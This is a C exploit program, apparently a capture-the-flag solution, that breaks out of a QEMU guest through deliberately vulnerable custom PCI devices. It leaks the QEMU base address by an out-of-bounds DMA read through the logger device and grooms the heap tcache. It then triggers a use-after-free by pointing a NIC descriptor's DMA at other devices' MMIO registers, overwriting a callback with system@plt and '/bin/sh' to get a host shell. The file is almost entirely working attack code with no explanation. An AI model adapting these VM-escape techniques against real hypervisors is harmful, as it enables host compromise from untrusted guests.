#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define SUCCESS_MSG(msg) "\033[32m\033[1m" msg "\033[0m"
#define INFO_MSG(msg) "\033[34m\033[1m" msg "\033[0m"
#define ERROR_MSG(msg) "\033[31m\033[1m" msg "\033[0m"

#define log_success(msg) puts(SUCCESS_MSG(msg))
#define log_info(msg) puts(INFO_MSG(msg))
#define log_error(msg) puts(ERROR_MSG(msg))

#define MMIO_SIZE 0x1000

enum {
    CTF_NIC = 0,
    CTF_WATCHDOG = 1,
    CTF_AUDIO = 2,
    CTF_LOGGER = 3,
    CTF_MSG = 4,
    DEVICE_COUNT = 5,
};

typedef struct CTFNICRxDesc {
    uint64_t buffer1_gpa;
    uint32_t length1;
    uint32_t reserved1;
    uint64_t buffer2_gpa;
    uint32_t length2;
    uint32_t reserved2;
    uint64_t completion_gpa;
} CTFNICRxDesc;

typedef struct CTFSharedObject {
    void *timer;
    char message[64];
    int (*callback)(const char *message);
    uint32_t state;
    uint32_t generation;
} CTFSharedObject;

static const char *devices[DEVICE_COUNT] = {
    "0000:00:03.0", // ctf-nic
    "0000:00:04.0", // ctf-watchdog
    "0000:00:05.0", // ctf-audio
    "0000:00:06.0", // ctf-logger
    "0000:00:07.0", // ctf-msg
};

static const uint64_t pci_bar0[DEVICE_COUNT] = {
    [CTF_NIC] = 0xFEBD5000,    [CTF_WATCHDOG] = 0xFEBD6000, [CTF_AUDIO] = 0xFEBD7000,
    [CTF_LOGGER] = 0xFEBD8000, [CTF_MSG] = 0xFEBD9000,
};

int fd[DEVICE_COUNT] = { -1 };
volatile unsigned char *mmio[DEVICE_COUNT] = { NULL };

void dump_hex(const void *buf, size_t len)
{
    const unsigned char *p = buf;

    for (size_t i = 0; i < len; i += 16) {
        printf("%08zx  ", i);

        for (size_t j = 0; j < 16; j++) {
            if (i + j < len)
                printf("%02x ", p[i + j]);
            else
                printf("   ");

            if (j == 7)
                putchar(' ');
        }

        printf(" |");
        for (size_t j = 0; j < 16 && i + j < len; j++) {
            unsigned char c = p[i + j];
            putchar(isprint(c) ? c : '.');
        }
        printf("|\n");
    }
}

uint64_t virt_to_phys(const void *addr)
{
    uint64_t virt = (uintptr_t)addr;
    long page_size = sysconf(_SC_PAGESIZE);

    if (page_size <= 0) {
        fprintf(stderr, "invalid page size\n");
        exit(1);
    }

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        perror("open pagemap");
        exit(1);
    }

    uint64_t entry;
    off_t offset = (virt / page_size) * sizeof(entry);

    if (pread(fd, &entry, sizeof(entry), offset) != sizeof(entry)) {
        perror("pread pagemap");
        close(fd);
        exit(1);
    }

    close(fd);

    if (!(entry & (1ULL << 63))) {
        fprintf(stderr, "page not present\n");
        exit(1);
    }

    uint64_t pfn = entry & ((1ULL << 55) - 1);

    if (!pfn) {
        fprintf(stderr, "PFN unavailable (check CAP_SYS_ADMIN)\n");
        exit(1);
    }

    return pfn * (uint64_t)page_size + virt % page_size;
}

// ctf_msg
void ctf_msg_create(void) { *(volatile uint32_t *)(&mmio[CTF_MSG][0]) = 0; }
void ctf_msg_free(void) { *(volatile uint32_t *)(&mmio[CTF_MSG][4]) = 0; }
void ctf_msg_invoke(void) { *(volatile uint32_t *)(&mmio[CTF_MSG][8]) = 0; }

// ctf_logger
void ctf_logger_set_offset(uint32_t offset)
{
    *(volatile uint32_t *)(&mmio[CTF_LOGGER][8]) = offset;
}
void ctf_logger_set_length(uint32_t length)
{
    *(volatile uint32_t *)(&mmio[CTF_LOGGER][0xc]) = length;
}
void ctf_logger_set_dma_addr_low(uint32_t num)
{
    *(volatile uint32_t *)(&mmio[CTF_LOGGER][0]) = num;
}
void ctf_logger_set_dma_addr_high(uint32_t num)
{
    *(volatile uint32_t *)(&mmio[CTF_LOGGER][4]) = num;
}
void ctf_logger_set_dma_addr(uint64_t addr)
{
    ctf_logger_set_dma_addr_low(addr & 0xffffffff);
    ctf_logger_set_dma_addr_high(addr >> 32);
}
void ctf_logger_copy(void) { *(volatile uint32_t *)(&mmio[CTF_LOGGER][0x10]) = 0; }

// ctf_nic
void ctf_nic_set_rx_desc_gpa_low(uint32_t num)
{
    *(volatile uint32_t *)(&mmio[CTF_NIC][0x10]) = num;
}
void ctf_nic_set_rx_desc_gpa_high(uint32_t num)
{
    *(volatile uint32_t *)(&mmio[CTF_NIC][0x14]) = num;
}
void ctf_nic_set_rx_desc_gpa(uint64_t addr)
{
    ctf_nic_set_rx_desc_gpa_low(addr & 0xffffffff);
    ctf_nic_set_rx_desc_gpa_high(addr >> 32);
}
void ctf_nic_handle_rx(void) { *(volatile uint32_t *)(&mmio[CTF_NIC][0x1c]) = 1; }

// ctf_audio
void ctf_audio_set_dma_len(uint32_t length)
{
    *(volatile uint32_t *)(&mmio[CTF_AUDIO][0x10]) = length;
}
void ctf_audio_set_dma_addr_low(uint32_t num) { *(volatile uint32_t *)(&mmio[CTF_AUDIO][8]) = num; }
void ctf_audio_set_dma_addr_high(uint32_t num)
{
    *(volatile uint32_t *)(&mmio[CTF_AUDIO][0xc]) = num;
}
void ctf_audio_set_dma_addr(uint64_t addr)
{
    ctf_audio_set_dma_addr_low(addr & 0xffffffff);
    ctf_audio_set_dma_addr_high(addr >> 32);
}

// ctf_watchdog
void ctf_watchdog_destroy(void) { *(volatile uint32_t *)(&mmio[CTF_WATCHDOG][0x28]) = 0; }
void ctf_watchdog_ensure(void) { *(volatile uint32_t *)(&mmio[CTF_WATCHDOG][0x24]) = 0; }

static void open_pci_device(int id)
{
    char path[128];

    snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/resource0", devices[id]);

    fd[id] = open(path, O_RDWR | O_SYNC);
    if (fd[id] < 0) {
        perror(path);
        exit(EXIT_FAILURE);
    }

    void *addr = mmap(NULL, MMIO_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd[id], 0);

    if (addr == MAP_FAILED) {
        perror("mmap PCI BAR0");
        close(fd[id]);
        fd[id] = -1;
        exit(EXIT_FAILURE);
    }

    mmio[id] = addr;
}

static void pci_enable_bus_master(int id)
{
    char path[128];

    snprintf(path, sizeof(path), "/sys/bus/pci/devices/%s/config", devices[id]);

    int config_fd = open(path, O_RDWR);
    if (config_fd < 0) {
        perror(path);
        exit(EXIT_FAILURE);
    }

    uint16_t command;

    if (pread(config_fd, &command, sizeof(command), 0x04) != sizeof(command)) {
        perror("pread PCI_COMMAND");
        close(config_fd);
        exit(EXIT_FAILURE);
    }

    if (!(command & 0x0004)) {
        command |= 0x0004;

        if (pwrite(config_fd, &command, sizeof(command), 0x04) != sizeof(command)) {
            perror("pwrite PCI_COMMAND");
            close(config_fd);
            exit(EXIT_FAILURE);
        }
    }

    if (pread(config_fd, &command, sizeof(command), 0x04) != sizeof(command)) {
        perror("verify PCI_COMMAND");
        close(config_fd);
        exit(EXIT_FAILURE);
    }

    close(config_fd);

    if (!(command & 0x0004)) {
        fprintf(stderr, "Failed to enable Bus Master: %s\n", devices[id]);
        exit(EXIT_FAILURE);
    }
}

static void init(void)
{
    for (int i = 0; i < DEVICE_COUNT; i++) {
        open_pci_device(i);
        pci_enable_bus_master(i);
    }
}

void fini(void)
{
    for (int i = 0; i < DEVICE_COUNT; i++) {
        munmap((void *)mmio[i], MMIO_SIZE);
        close(fd[i]);
    }
}

void *init_buf(void)
{
    void *buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (buf == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }

    memset(buf, 0, 0x1000);

    if (mlock(buf, 0x1000) < 0) {
        perror("mlock");
        exit(1);
    }

    return buf;
}

void exploition(void)
{
    uint64_t qemu_base = 0;
    uint64_t system_plt = 0;
    unsigned char *buffer = init_buf();

    // step1: leak qemu_base
    ctf_logger_set_offset(0x1010);
    ctf_logger_set_length(0x10);
    ctf_logger_set_dma_addr((uint64_t)virt_to_phys((const void *)buffer));
    ctf_logger_copy();

    qemu_base = *(uint64_t *)(&buffer[8]) - 0x4132C7;
    system_plt = qemu_base + 0x2E2C94;
    printf(SUCCESS_MSG("[+] qemu_base: 0x%lx\n"), qemu_base);
    printf(INFO_MSG("[*] system_plt_addr: 0x%lx\n"), system_plt);
    putchar('\n');

    // step2:alloc shared object from vCPU thread arena and fill tcache[0x60]
    for (int i = 0; i < 8; i++) {
        ctf_watchdog_destroy();
        ctf_watchdog_ensure();
    }

    // step3: UAF while ctf_nic_handle_rx()
    CTFNICRxDesc *payload1 = (CTFNICRxDesc *)buffer;
    payload1->buffer1_gpa = pci_bar0[CTF_WATCHDOG] + 0x28; // ctf_watchdog_destroy
    payload1->length1 = 4;
    payload1->buffer2_gpa = pci_bar0[CTF_AUDIO]; // ctf_audio_allocate
    payload1->length2 = 4;
    payload1->completion_gpa = pci_bar0[CTF_AUDIO] + 0x14; // ctf_audio_dma_write_buffer

    CTFSharedObject *payload2 = (CTFSharedObject *)(buffer + sizeof(CTFNICRxDesc));
    strncpy(payload2->message, "/bin/sh", sizeof(payload2->message));
    payload2->callback = (void *)system_plt;

    ctf_nic_set_rx_desc_gpa((uint64_t)virt_to_phys((const void *)payload1));
    ctf_audio_set_dma_addr((uint64_t)virt_to_phys((const void *)payload2));
    ctf_audio_set_dma_len(0x50);

    ctf_nic_handle_rx(); // trigger attack!
}

int main(void)
{
    init();
    exploition();
    fini();
    return 0;
}